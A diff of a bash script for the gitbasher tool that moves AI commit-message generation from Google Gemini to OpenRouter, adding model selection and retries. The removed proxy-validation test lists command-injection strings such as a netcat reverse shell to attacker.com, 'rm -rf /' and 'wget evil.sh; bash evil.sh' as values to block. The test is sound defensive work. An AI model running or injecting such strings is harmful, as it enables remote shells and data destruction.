@@ -2,8 +2,8 @@
 
 ### AI Functions for commit message generation
 
-# Google Gemini API endpoint
-readonly GOOGLE_API_URL="https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent"
+# OpenRouter API endpoint (OpenAI-compatible)
+readonly OPENROUTER_API_URL="https://openrouter.ai/api/v1/chat/completions"
 
 ### Function to get AI API key from git config
 # Returns: AI API key or empty if not set
@@ -15,6 +15,16 @@ function get_ai_api_key {
 # $1: API key
 function set_ai_api_key {
     set_config_value gitbasher.ai-api-key "$1"
+}
+
+### Function to get/set AI model (OpenRouter)
+# Returns: model id or default if not set
+function get_ai_model {
+    get_config_value gitbasher.ai-model "openrouter/auto"
+}
+
+function set_ai_model {
+    set_config_value gitbasher.ai-model "$1"
 }
 
 ### Function to get AI proxy URL from git config
@@ -168,11 +178,13 @@ function secure_curl_with_api_key {
             curl_cmd+=(--proxy "$proxy_url")
         fi
         
-        # Add remaining options
+        # Add remaining options for OpenRouter
         curl_cmd+=(
-            "$GOOGLE_API_URL"
+            "$OPENROUTER_API_URL"
             -H "Content-Type: application/json"
-            -H "x-goog-api-key: $api_key"
+            -H "Authorization: Bearer $api_key"
+            -H "HTTP-Referer: https://github.com/maxbolgarin/gitbasher"
+            -H "X-Title: gitbasher"
             -d "$json_payload"
         )
         
@@ -181,15 +193,17 @@ function secure_curl_with_api_key {
     )
 }
 
-### Function to make request to Gemini API
+### Function to make request to OpenRouter API
 # $1: prompt text
 # Returns: AI response text
-function call_gemini_api {
+function call_openrouter_api {
     # Set trap to clear sensitive variables on exit/interrupt
     trap 'clear_sensitive_vars' EXIT INT TERM
     
     local prompt="$1"
     local api_key=$(get_ai_api_key)
+    local max_retries=2
+    local retry_delay=2
     
     if [ -z "$api_key" ]; then
         echo -e "${RED}AI API key not configured. Set it with: gitb config${ENDCOLOR}" >&2
@@ -199,25 +213,19 @@ function call_gemini_api {
     
     # Escape special characters in prompt for JSON
     local escaped_prompt=$(echo "$prompt" | sed 's/\\/\\\\/g' | sed 's/"/\\"/g' | tr '\n' ' ' | sed 's/  */ /g')
-    
-    local json_payload="{
-        \"contents\": [{
-            \"parts\": [{
-                \"text\": \"$escaped_prompt\"
-            }]
-        }],
-        \"generationConfig\": {
-            \"temperature\": 0.1,
-            \"maxOutputTokens\": 100,
-            \"topP\": 0.8,
-            \"topK\": 10
-        }
-    }"
-    
-    # Make API request with optional proxy
+
+    # Select OpenRouter model (OpenAI-compatible)
+    local model=$(get_ai_model)
+
+    # Build OpenAI-style payload for OpenRouter
+    local json_payload="{\"model\":\"$model\",\"messages\":[{\"role\": \"user\", \"content\": \"$escaped_prompt\"}]}"
+
+    # Make API request with optional proxy and retry logic
     local proxy_url=$(get_ai_proxy)
     local safe_proxy_url=""
     local response=""
+    local curl_exit_code=0
+    local retry_count=0
     
     if [ -n "$proxy_url" ]; then
         # Validate and sanitize proxy URL to prevent command injection
@@ -231,12 +239,39 @@ function call_gemini_api {
         
         # Use the validated proxy URL
         safe_proxy_url="$validated_proxy_url"
-        response=$(secure_curl_with_api_key "$safe_proxy_url" "$api_key" "$json_payload")
-    else
-        response=$(secure_curl_with_api_key "" "$api_key" "$json_payload")
     fi
     
-    local curl_exit_code=$?
+    # Retry logic for server errors
+    while [ $retry_count -le $max_retries ]; do
+        if [ -n "$safe_proxy_url" ]; then
+            response=$(secure_curl_with_api_key "$safe_proxy_url" "$api_key" "$json_payload")
+        else
+            response=$(secure_curl_with_api_key "" "$api_key" "$json_payload")
+        fi
+        
+        curl_exit_code=$?
+        
+        # If successful or non-retryable error, break
+        if [ $curl_exit_code -eq 0 ] && [ -n "$response" ]; then
+            # Check if it's a server error that we should retry
+            local has_error=$(echo "$response" | grep -q '"error"' && echo "true" || echo "false")
+            if [ "$has_error" = "true" ]; then
+                local error_code=$(echo "$response" | grep -o '"code"[[:space:]]*:[[:space:]]*[0-9]*' | grep -o '[0-9]*')
+                # Only retry on 500/502/503 errors
+                if [[ "$error_code" =~ ^(500|502|503)$ ]]; then
+                    if [ $retry_count -lt $max_retries ]; then
+                        echo -e "${YELLOW}Server error $error_code, retrying in ${retry_delay}s... (attempt $((retry_count + 1))/$((max_retries + 1)))${ENDCOLOR}" >&2
+                        sleep $retry_delay
+                        retry_count=$((retry_count + 1))
+                        continue
+                    fi
+                fi
+            fi
+        fi
+        
+        # Break if successful or max retries reached
+        break
+    done
     
     if [ $curl_exit_code -ne 0 ] || [ -z "$response" ]; then
         echo
@@ -266,16 +301,16 @@ function call_gemini_api {
         else
             echo -e "  • No proxy configured" >&2
             echo -e "${YELLOW}Direct connection troubleshooting:${ENDCOLOR}" >&2
-            echo -e "  • Test connection: ${BOLD}curl --connect-timeout 10 https://generativelanguage.googleapis.com${ENDCOLOR}" >&2
+            echo -e "  • Test connection: ${BOLD}curl --connect-timeout 10 https://openrouter.ai${ENDCOLOR}" >&2
             
-            # Test direct connectivity to Google API
-            echo -e "${YELLOW}Testing direct connectivity to Google AI...${ENDCOLOR}" >&2
-            local direct_test=$(curl --connect-timeout 5 --max-time 10 -s -I https://generativelanguage.googleapis.com 2>&1)
+            # Test direct connectivity to OpenRouter API
+            echo -e "${YELLOW}Testing direct connectivity to OpenRouter...${ENDCOLOR}" >&2
+            local direct_test=$(curl --connect-timeout 5 --max-time 10 -s -I https://openrouter.ai 2>&1)
             local direct_test_code=$?
             if [ $direct_test_code -eq 0 ]; then
-                echo -e "  ✅ Google AI endpoint: Reachable" >&2
+                echo -e "  ✅ OpenRouter endpoint: Reachable" >&2
             else
-                echo -e "  ❌ Google AI endpoint: Failed (exit code: $direct_test_code)" >&2
+                echo -e "  ❌ OpenRouter endpoint: Failed (exit code: $direct_test_code)" >&2
                 echo -e "  📝 Error: $(echo "$direct_test" | head -1)" >&2
                 echo -e "  💡 Consider configuring a proxy: gitb cfg proxy" >&2
             fi
@@ -301,8 +336,9 @@ function call_gemini_api {
     if [ "$has_error" = "true" ]; then
         # Extract error details using grep and more robust parsing
         local error_code=$(echo "$response" | grep -o '"code"[[:space:]]*:[[:space:]]*[0-9]*' | grep -o '[0-9]*')
-        local error_message=$(echo "$response" | grep -o '"message"[[:space:]]*:[[:space:]]*"[^"]*"' | sed 's/"message"[[:space:]]*:[[:space:]]*"\([^"]*\)"/\1/')
+        local error_message=$(echo "$response" | grep -o '"message"[[:space:]]*:[[:space:]]*"[^"]*"' | sed 's/"message"[[:space:]]*:[[:space:]]*"\([^\"]*\)"/\1/')
         
+        echo >&2
         echo -e "${RED}AI API Error${ENDCOLOR}" >&2
         if [ -n "$error_code" ]; then
             echo -e "${RED}Error Code: $error_code${ENDCOLOR}" >&2
@@ -311,29 +347,26 @@ function call_gemini_api {
             echo -e "${RED}Error Message: $error_message${ENDCOLOR}" >&2
         fi
         
-        # Provide helpful suggestions based on error type
+        # Show full API response for debugging
         echo >&2
+        echo -e "${YELLOW}📋 Full API Response:${ENDCOLOR}" >&2
+        echo "$response" >&2
+        echo >&2
+        
+        # Provide helpful suggestions based on error type
         case "$error_code" in
             400)
-                if [[ "$error_message" == *"location is not supported"* ]]; then
-                    echo -e "${YELLOW}⚠️  Geographic restriction: Google's Gemini API is not available in your region.${ENDCOLOR}" >&2
-                    echo -e "${YELLOW}Solutions:${ENDCOLOR}" >&2
-                    echo -e "${YELLOW}  • Configure proxy with: gitb cfg proxy${ENDCOLOR}" >&2
-                    echo -e "${YELLOW}  • Use a VPN to connect from a supported region${ENDCOLOR}" >&2
-                    echo -e "${YELLOW}  • Use manual commit messages for now${ENDCOLOR}" >&2
-                else
-                    echo -e "${YELLOW}⚠️  Bad request: Check your API configuration or prompt format.${ENDCOLOR}" >&2
-                    echo -e "${YELLOW}Solutions:${ENDCOLOR}" >&2
-                    echo -e "${YELLOW}  • Verify your API key is correct${ENDCOLOR}" >&2
-                    echo -e "${YELLOW}  • Try again with a smaller commit diff${ENDCOLOR}" >&2
-                fi
+                echo -e "${YELLOW}⚠️  Bad request: Check your API configuration or prompt format.${ENDCOLOR}" >&2
+                echo -e "${YELLOW}Solutions:${ENDCOLOR}" >&2
+                echo -e "${YELLOW}  • Verify your API key is correct${ENDCOLOR}" >&2
+                echo -e "${YELLOW}  • Try again with a smaller commit diff${ENDCOLOR}" >&2
                 ;;
             401|403)
                 echo -e "${YELLOW}🔐 Authentication error: Invalid or expired API key.${ENDCOLOR}" >&2
                 echo -e "${YELLOW}Solutions:${ENDCOLOR}" >&2
                 echo -e "${YELLOW}  • Check your API key with: gitb cfg ai${ENDCOLOR}" >&2
-                echo -e "${YELLOW}  • Generate a new API key at: https://makersuite.google.com/app/apikey${ENDCOLOR}" >&2
-                echo -e "${YELLOW}  • Ensure your API key has proper permissions${ENDCOLOR}" >&2
+                echo -e "${YELLOW}  • Get an OpenRouter key at: https://openrouter.ai/keys${ENDCOLOR}" >&2
+                echo -e "${YELLOW}  • Ensure your key has proper permissions${ENDCOLOR}" >&2
                 ;;
             429)
                 echo -e "${YELLOW}⏱️  Rate limit exceeded: Too many requests.${ENDCOLOR}" >&2
@@ -342,13 +375,16 @@ function call_gemini_api {
                 echo -e "${YELLOW}  • Consider upgrading your API plan for higher limits${ENDCOLOR}" >&2
                 ;;
             500|502)
-                echo -e "${YELLOW}🔧 Server error: Google's service is experiencing issues.${ENDCOLOR}" >&2
+                echo -e "${YELLOW}🔧 Server error: AI service is experiencing issues.${ENDCOLOR}" >&2
                 echo -e "${YELLOW}Solutions:${ENDCOLOR}" >&2
                 echo -e "${YELLOW}  • Try again in a few minutes${ENDCOLOR}" >&2
-                echo -e "${YELLOW}  • Check Google's API status page${ENDCOLOR}" >&2
+                echo -e "${YELLOW}  • Check OpenRouter status: https://status.openrouter.ai${ENDCOLOR}" >&2
+                echo -e "${YELLOW}  • Use manual commit message for now: gitb c${ENDCOLOR}" >&2
+                echo -e "${YELLOW}  • Try a different model: gitb cfg model${ENDCOLOR}" >&2
+                echo -e "${YELLOW}  • Check your API key balance: https://openrouter.ai/keys${ENDCOLOR}" >&2
                 ;;
             503)
-                echo -e "${YELLOW}📊 Service overloaded: Google's servers are busy.${ENDCOLOR}" >&2
+                echo -e "${YELLOW}📊 Service overloaded: Provider servers are busy.${ENDCOLOR}" >&2
                 echo -e "${YELLOW}Solutions:${ENDCOLOR}" >&2
                 echo -e "${YELLOW}  • Try again in a few minutes${ENDCOLOR}" >&2
                 echo -e "${YELLOW}  • Retry during off-peak hours${ENDCOLOR}" >&2
@@ -358,10 +394,9 @@ function call_gemini_api {
                 if [[ "$error_message" == *"suspended"* ]]; then
                     echo -e "${YELLOW}🚫 Account suspended: Your API access has been suspended.${ENDCOLOR}" >&2
                     echo -e "${YELLOW}Solutions:${ENDCOLOR}" >&2
-                    echo -e "${YELLOW}  • Contact Google Support to resolve account issues${ENDCOLOR}" >&2
-                    echo -e "${YELLOW}  • Check your Google Cloud Console for notices${ENDCOLOR}" >&2
+                    echo -e "${YELLOW}  • Contact OpenRouter Support to resolve account issues${ENDCOLOR}" >&2
                 elif [[ "$error_message" == *"location is not supported"* ]]; then
-                    echo -e "${YELLOW}⚠️  Geographic restriction: Google's Gemini API is not available in your region.${ENDCOLOR}" >&2
+                    echo -e "${YELLOW}⚠️  Geographic restriction: Service may be unavailable in your region.${ENDCOLOR}" >&2
                     echo -e "${YELLOW}Solutions:${ENDCOLOR}" >&2
                     echo -e "${YELLOW}  • Configure proxy with: gitb cfg proxy${ENDCOLOR}" >&2
                     echo -e "${YELLOW}  • Use a VPN to connect from a supported region${ENDCOLOR}" >&2
@@ -369,7 +404,7 @@ function call_gemini_api {
                 else
                     echo -e "${YELLOW}❓ Unknown error occurred.${ENDCOLOR}" >&2
                     echo -e "${YELLOW}Solutions:${ENDCOLOR}" >&2
-                    echo -e "${YELLOW}  • Check Google's API documentation${ENDCOLOR}" >&2
+                    echo -e "${YELLOW}  • Check OpenAI-compatible API documentation${ENDCOLOR}" >&2
                     echo -e "${YELLOW}  • Try again later${ENDCOLOR}" >&2
                 fi
                 ;;
@@ -379,22 +414,9 @@ function call_gemini_api {
         return 1
     fi
     
-    # More robust JSON parsing for Gemini API response
-    # Try different patterns to extract the text content
+    # Parse OpenAI-style response from OpenRouter
     local ai_response=""
-    
-    # Pattern 1: Standard text field
-    ai_response=$(echo "$response" | sed -n 's/.*"text"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)
-    
-    # Pattern 2: If that fails, try extracting from candidates array
-    if [ -z "$ai_response" ]; then
-        ai_response=$(echo "$response" | sed -n 's/.*"candidates".*"text"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)
-    fi
-    
-    # Pattern 3: Try with content -> parts -> text structure
-    if [ -z "$ai_response" ]; then
-        ai_response=$(echo "$response" | sed -n 's/.*"content".*"parts".*"text"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p' | head -1)
-    fi
+    ai_response=$(echo "$response" | sed -n 's/.*\"choices\"[[:space:]]*:[[:space:]]*\[.*\"message\"[[:space:]]*:[[:space:]]*{[[:space:]]*\"role\"[[:space:]]*:[[:space:]]*\"assistant\"[[:space:]]*,[[:space:]]*\"content\"[[:space:]]*:[[:space:]]*\"\([^\"]*\)\".*/\1/p' | head -1)
     
     # Clean up escaped characters
     if [ -n "$ai_response" ]; then
@@ -504,7 +526,7 @@ Write ONLY the commit header in the format 'type(scope): subject', do not write 
 
 Respond with only the commit message, nothing else."
 
-    call_gemini_api "$prompt"
+    call_openrouter_api "$prompt"
 }
 
 
@@ -554,7 +576,7 @@ Write ONLY the commit message, do not write body or footer.
 
 Respond with only the commit message without any other text, nothing else."
 
-    call_gemini_api "$prompt"
+    call_openrouter_api "$prompt"
 }
 
 
@@ -626,50 +648,8 @@ The body should explain why you are making the change. The length of the body sh
 
 Respond with only the full commit message, nothing else."
 
-    call_gemini_api "$prompt"
+    call_openrouter_api "$prompt"
 }
-
-### Function to test proxy URL validation (for development/testing)
-# Uncomment and run this function to test the validation
-# function test_proxy_validation {
-#     echo "Testing proxy URL validation..."
-#     
-#     # Valid URLs - should pass
-#     local test_urls=(
-#         "http://proxy.example.com:8080"
-#         "https://proxy.example.com:8080" 
-#         "socks5://proxy.example.com:1080"
-#         "proxy.example.com:8080"
-#         "http://user:pass@proxy.example.com:8080"
-#     )
-#     
-#     # Invalid/malicious URLs - should fail
-#     local malicious_urls=(
-#         "http://proxy.com; rm -rf /; #"
-#         "proxy.com:8080 && curl malicious.com"
-#         "proxy.com:8080|nc -e /bin/sh attacker.com 4444"
-#         "\$(curl malicious.com)"
-#         "proxy.com:8080; wget evil.sh; bash evil.sh"
-#     )
-#     
-#     echo "Testing valid URLs:"
-#     for url in "${test_urls[@]}"; do
-#         if validate_proxy_url "$url"; then
-#             echo "✓ PASS: $url -> $validated_proxy_url"
-#         else
-#             echo "✗ FAIL: $url (should have passed)"
-#         fi
-#     done
-#     
-#     echo -e "\nTesting malicious URLs:"
-#     for url in "${malicious_urls[@]}"; do
-#         if validate_proxy_url "$url"; then
-#             echo "✗ SECURITY RISK: $url -> $validated_proxy_url (should have failed!)"
-#         else
-#             echo "✓ BLOCKED: $url"
-#         fi
-#     done
-# }
 
 ### Function to securely clear sensitive variables
 # This helps prevent API key exposure via memory dumps or env vars
@@ -683,7 +663,7 @@ function clear_sensitive_vars {
     unset api_key 2>/dev/null
     unset ai_key_input 2>/dev/null
     unset AI_API_KEY 2>/dev/null
-    unset GEMINI_API_KEY 2>/dev/null
+    unset OPENROUTER_API_KEY 2>/dev/null
     
     # Force garbage collection of shell variables (bash-specific)
     if [ -n "$BASH_VERSION" ]; then
